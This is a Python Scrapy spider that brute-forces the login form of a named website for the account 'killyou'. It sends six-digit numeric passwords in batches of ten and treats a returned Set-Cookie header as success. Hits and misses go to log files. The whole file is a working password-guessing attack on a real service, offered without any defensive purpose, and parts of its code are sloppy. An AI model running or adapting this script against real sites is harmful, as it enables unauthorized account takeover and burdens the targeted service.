# -*- coding: utf-8 -*-
import scrapy
from scrapy import FormRequest
from scrapy.http.request import Request
import time,os,sys


class Haixing8Spider(scrapy.Spider):
    name = 'killyou_10' # 爬虫名称
    allowed_domains = ['http://ms.haixing8.cn'] # 允许的域名
    start_urls = ['http://ms.haixing8.cn'] # 起始url
    password = []
    username = 'killyou'

    # 爬虫日志路径
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    FLOG_DIR = os.path.join(BASE_DIR,'log', name ,'fail.log')
    SLOG_DIR = os.path.join(BASE_DIR,'log', name ,'success.log')

    # 并发链接完成
    flag = True

    # 10个链接
    for i in range(-9,1):
        password.append(i)  

    # 初始链接
    password.append(0)

    def start_requests(self):
        url = 'http://ms.haixing8.cn/commreg/channel.php?d=login.start&spid=trdo&clienttype=WAP2'
        # return [Request(url=url, callback=self.login)]
        if not os.path.exists(os.path.join(self.BASE_DIR,'log', self.name)):
            os.mkdir(os.path.join(self.BASE_DIR,'log', self.name))
        yield Request(
            url=url, 
            # 使用lambda来表示带参数的callback函数
            callback = lambda response, tag = 10 : self.login(response, tag), 
            dont_filter = True # 相同url不过滤
            )

    def login(self, response, tag):
        self.chink_password(tag)
        url = 'http://ms.haixing8.cn/commreg/channel.php?d=login.startover&amp;spid=&amp;clienttype=WAP2'
        form_data = {
            'username': self.username, 
            'password': self.password[tag], 
            'submit': '确定'
            }  # 表单数据，字典格式，注意数字也要用引号引起来，否则报错。
        req = FormRequest(
            url = url, 
            method = 'POST',
            formdata = form_data,
            callback = lambda response, passwd = self.password[tag] : self.check_login(response, passwd), # 传递当前验证的密码
            dont_filter = True # 相同url不过滤
            )
        # print('------------------start_login-----------------')
        # 10个链接的最后一个
        if tag == 9:
            self.flag = True
        yield req

    def check_login(self, response, password):
        header = response.headers
        if b'Set-Cookie' in header.keys():
            f = open(self.SLOG_DIR,'a+')
            f.write("%s:success---%s---password:%s\r" %(time.strftime("[%Y-%m-%d %H:%M:%S]"), self.username, password))
            f.close
            return
        elif len(str(password)) == 7:
            return
        else:
            f = open(self.FLOG_DIR,'a+')
            f.write("%s:fail---%s---password:%s\r" %(time.strftime("[%Y-%m-%d %H:%M:%S]"), self.username, password))
            f.close
            if self.flag :
                # 等待10个请求发送完毕
                self.flag = False
                for i in range(10):
                    self.change_password(i)
                    url = 'http://ms.haixing8.cn/commreg/channel.php?d=login.start&spid=trdo&clienttype=WAP2'
                    # return [Request(url=url, callback=self.login)]
                    yield Request(
                        url = url,
                         callback = lambda response, i = i : self.login(response, i), 
                         dont_filter = True
                        )

    def chink_password (self, tag):
        password = str(int(self.password[tag]))
        # 凑齐六位数
        if len(password) >= 6 :
            pass
        else:
            self.password[tag] = (6 - len(password))*"0" + password
    
    # 增加10，
    def change_password(self, tag):
        password = int(self.password[tag])
        password += 10
        self.password[tag] = str(password)
        self.chink_password(tag)